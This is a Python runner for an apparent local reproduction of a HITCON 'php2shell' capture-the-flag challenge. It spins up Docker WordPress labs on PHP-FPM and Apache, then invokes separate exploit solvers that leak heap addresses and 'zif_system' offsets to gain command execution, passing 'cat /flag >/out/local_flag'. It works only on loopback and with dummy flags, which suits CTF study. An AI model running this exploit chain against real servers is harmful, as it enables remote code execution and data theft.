#!/usr/bin/env python3

import argparse
import json
import os
import secrets
import shlex
import socket
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
FPM_LAB = ROOT / "lab"
APACHE_LAB = ROOT / "lab" / "apache"
FPM_SOLVER = ROOT / "solve.py"
APACHE_SOLVER = ROOT / "apache" / "solve.py"
APACHE_PROXY = ROOT / "lab" / "apache" / "proxy.py"
INSTALLER = ROOT / "lab" / "install.py"

FPM_A_FLAG = "hitcon{local_fpm_instance_a_do_not_submit}"
FPM_B_FLAG = "hitcon{local_fpm_instance_b_do_not_submit}"
APACHE_FLAG = "hitcon{local_apache_instance_do_not_submit}"


def info(text):
    print(f"[*] {text}", flush=True)


def good(text):
    print(f"[+] {text}", flush=True)


def run(command, *, cwd=ROOT, env=None, timeout=1800, check=True):
    shown = " ".join(shlex.quote(str(item)) for item in command)
    info(shown)
    result = subprocess.run(
        [str(item) for item in command],
        cwd=cwd,
        env=env,
        timeout=timeout,
        check=False,
    )
    if check and result.returncode:
        raise RuntimeError(f"command failed with exit code {result.returncode}: {shown}")
    return result


def compose(docker, project, directory, env, *args, check=True, timeout=1800):
    return run(
        [*docker, "compose", "-p", project, *args],
        cwd=directory,
        env=env,
        timeout=timeout,
        check=check,
    )


def down(docker, project, directory, env):
    compose(
        docker,
        project,
        directory,
        env,
        "down",
        "-v",
        "--remove-orphans",
        check=False,
        timeout=180,
    )


def free_port(port):
    sock = socket.socket()
    try:
        sock.bind(("127.0.0.1", port))
        return True
    except OSError:
        return False
    finally:
        sock.close()


def fresh_sid(prefix):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    suffix = "".join(secrets.choice(chars) for _ in range(15 - len(prefix)))
    return prefix + suffix


def fpm_environment(port, flag):
    env = os.environ.copy()
    env.update({
        "LAB_PORT": str(port),
        "DB_NAME": "wp_lab",
        "DB_USER": "wp_lab",
        "DB_PASSWORD": "local-test-password",
        "DB_ROOT_PASSWORD": "local-test-root-password",
        "LOCAL_FLAG": flag,
    })
    return env


def apache_environment(port, flag):
    env = os.environ.copy()
    env.update({
        "APACHE_PORT": str(port),
        "DB_NAME": "wp_apache",
        "DB_USER": "wp_lab",
        "DB_PASSWORD": secrets.token_urlsafe(24),
        "DB_ROOT_PASSWORD": secrets.token_urlsafe(24),
        "LOCAL_FLAG": flag,
    })
    return env


def run_fpm_instance(docker, docker_text, name, port, flag, root, keep_lab):
    project = f"php2shell-{name}"
    env = fpm_environment(port, flag)
    output = root / name

    down(docker, project, FPM_LAB, env)
    try:
        info(f"building {name} on port {port}")
        compose(docker, project, FPM_LAB, env, "up", "-d", "--build")
        run([sys.executable, INSTALLER, "--port", str(port)], timeout=180)

        sid = fresh_sid("fa" if name == "fpm-a" else "fb")
        run([
            sys.executable,
            FPM_SOLVER,
            "--execute",
            "--restart-at-start",
            "--port", str(port),
            "--container", "php2shell-fpm85",
            "--docker-command", docker_text,
            "--sid", sid,
            "--output-dir", output,
            "--expected-marker", flag,
        ], timeout=1200)

        result = json.loads((output / "result.json").read_text())
        responses = list(output.glob("r3-*.get.bin"))
        if not result.get("success") or len(responses) != 1:
            raise RuntimeError(f"{name} did not leave one successful GET proof")
        response = responses[0].read_bytes()
        if flag.encode() not in response:
            raise RuntimeError(f"{name} response does not contain its dummy flag")

        good(f"{name}: {flag}")
        return {
            "profile": name,
            "stack": "Nginx + PHP-FPM 8.5.11 + WordPress 6.9.10",
            "port": port,
            "flag": flag,
            "B": result["B"],
            "r2a_p_offset": result["r2a_p_offset"],
            "r2b_p_offset": result["r2b_p_offset"],
            "r3_q_offset": result["r3_q_offset"],
            "result": str((output / "result.json").resolve()),
        }
    finally:
        if not keep_lab:
            down(docker, project, FPM_LAB, env)


def run_apache_instance(docker, docker_text, port, flag, root, attempts, workers, keep_lab):
    project = "php2shell-apache-local"
    env = apache_environment(port, flag)
    proof_dir = APACHE_LAB / "proofs"
    proof_dir.mkdir(parents=True, exist_ok=True)
    try:
        proof_dir.chmod(0o777)
    except OSError:
        pass
    proof = proof_dir / "local_flag"
    if proof.exists():
        proof.unlink()

    proxy = None
    down(docker, project, APACHE_LAB, env)
    try:
        info(f"building apache-wordpress on port {port}")
        compose(docker, project, APACHE_LAB, env, "up", "-d", "--build")

        proxy = subprocess.Popen(
            [
                sys.executable,
                APACHE_PROXY,
                "--container", "php2shell-apache",
                "--listen-port", str(port),
                "--docker-command", docker_text,
            ],
            cwd=ROOT,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
        )
        for _ in range(50):
            if proxy.poll() is not None:
                error = proxy.stderr.read() if proxy.stderr else ""
                raise RuntimeError(f"Apache relay stopped: {error.strip()}")
            if not free_port(port):
                break
            time.sleep(0.1)
        else:
            raise RuntimeError("Apache relay did not open its loopback port")

        run([sys.executable, INSTALLER, "--port", str(port)], timeout=180)
        info("restarting Apache after WordPress installation")
        run([*docker, "restart", "php2shell-apache"], timeout=120)
        time.sleep(2)

        for attempt in range(1, attempts + 1):
            if proof.exists():
                proof.unlink()
            if attempt > 1:
                info(f"restarting the Apache container for attempt {attempt}")
                run([*docker, "restart", "php2shell-apache"], timeout=120)
                time.sleep(2)

            output = root / "apache" / f"attempt-{attempt:02d}"
            result = run([
                sys.executable,
                APACHE_SOLVER,
                "--execute",
                "--port", str(port),
                "--workers", str(workers),
                "--proof", proof,
                "--output-dir", output,
                "--expected-marker", flag,
                "--command", "cat /flag >/out/local_flag",
            ], timeout=900, check=False)

            if result.returncode == 0 and (output / "result.json").is_file():
                data = json.loads((output / "result.json").read_text())
                raw = proof.read_bytes() if proof.is_file() else b""
                if data.get("success") and flag.encode() in raw:
                    saved = root / "apache" / "flag.txt"
                    saved.write_bytes(raw)
                    proof.unlink()
                    good(f"apache-wordpress: {flag}")
                    return {
                        "profile": "apache-wordpress",
                        "stack": "Apache 2 prefork + mod_php 8.4.26 + WordPress 7.0.7",
                        "port": port,
                        "attempt": attempt,
                        "flag": flag,
                        "libphp": data["libphp"],
                        "main": data["main"],
                        "zif_system": data["zif_system"],
                        "result": str((output / "result.json").resolve()),
                    }

            info(f"Apache attempt {attempt} missed")

        raise RuntimeError(f"Apache failed after {attempts} fresh-worker attempts")
    finally:
        if proof.exists():
            proof.unlink()
        if proxy is not None and proxy.poll() is None:
            proxy.terminate()
            try:
                proxy.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proxy.kill()
                proxy.wait(timeout=5)
        if not keep_lab:
            down(docker, project, APACHE_LAB, env)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--execute", action="store_true")
    parser.add_argument("--docker-command", default=os.environ.get("PHP2SHELL_DOCKER_CMD", "docker"))
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument("--fpm-a-port", type=int, default=18233)
    parser.add_argument("--fpm-b-port", type=int, default=18233)
    parser.add_argument("--apache-port", type=int, default=18322)
    parser.add_argument("--apache-attempts", type=int, default=3)
    parser.add_argument("--apache-workers", type=int, default=150)
    parser.add_argument("--keep-labs", action="store_true")
    args = parser.parse_args()

    docker = shlex.split(args.docker_command)
    if not docker:
        parser.error("empty Docker command")
    if args.fpm_a_port != 18233 or args.fpm_b_port != 18233:
        parser.error("the packaged FPM heap geometry is calibrated for sequential runs on port 18233")
    ports = [args.fpm_a_port, args.fpm_b_port, args.apache_port]
    if any(port < 1 or port > 65535 for port in ports) or args.apache_port in {args.fpm_a_port, args.fpm_b_port}:
        parser.error("ports must be valid and the Apache port must differ from both sequential FPM ports")
    if args.apache_attempts < 1 or args.apache_attempts > 5:
        parser.error("Apache attempts must be between 1 and 5")
    if args.apache_workers < 1 or args.apache_workers > 150:
        parser.error("Apache workers must be between 1 and 150")

    output = (args.output_dir or ROOT / "runs" / ("full-local-" + secrets.token_hex(4))).resolve()
    plan = {
        "mode": "full_local_challenge",
        "acceptance": "two clean FPM flag reads plus one clean Apache flag copy",
        "profiles": [
            {"name": "fpm-a", "port": args.fpm_a_port, "flag": FPM_A_FLAG},
            {"name": "fpm-b", "port": args.fpm_b_port, "flag": FPM_B_FLAG},
            {"name": "apache-wordpress", "port": args.apache_port, "flag": APACHE_FLAG},
        ],
        "authentic_hitcon_artifacts": False,
        "live_requests": 0 if not args.execute else "bounded local only",
    }
    if not args.execute:
        print(json.dumps(plan, indent=2))
        return

    if output.exists():
        parser.error(f"output directory already exists: {output}")
    for port in ports:
        if not free_port(port):
            parser.error(f"loopback port {port} is already in use")

    output.mkdir(parents=True)
    summary = {**plan, "output_dir": str(output), "profiles": [], "success": False}
    (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")

    try:
        first = run_fpm_instance(
            docker, args.docker_command, "fpm-a", args.fpm_a_port,
            FPM_A_FLAG, output, args.keep_labs,
        )
        summary["profiles"].append(first)
        (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")

        second = run_fpm_instance(
            docker, args.docker_command, "fpm-b", args.fpm_b_port,
            FPM_B_FLAG, output, args.keep_labs,
        )
        summary["profiles"].append(second)
        if first["B"] == second["B"]:
            raise RuntimeError("the two clean FPM instances leaked the same heap base")
        (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")

        apache = run_apache_instance(
            docker, args.docker_command, args.apache_port, APACHE_FLAG, output,
            args.apache_attempts, args.apache_workers, args.keep_labs,
        )
        summary["profiles"].append(apache)
        summary["success"] = True
        summary["flags"] = [profile["flag"] for profile in summary["profiles"]]
        summary["score"] = "3/3 local dummy flags"
        (output / "result.json").write_text(json.dumps(summary, indent=2) + "\n")
        (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")
        print(json.dumps(summary, indent=2))
    except Exception as error:
        summary["error"] = f"{type(error).__name__}: {error}"
        (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")
        raise


if __name__ == "__main__":
    main()
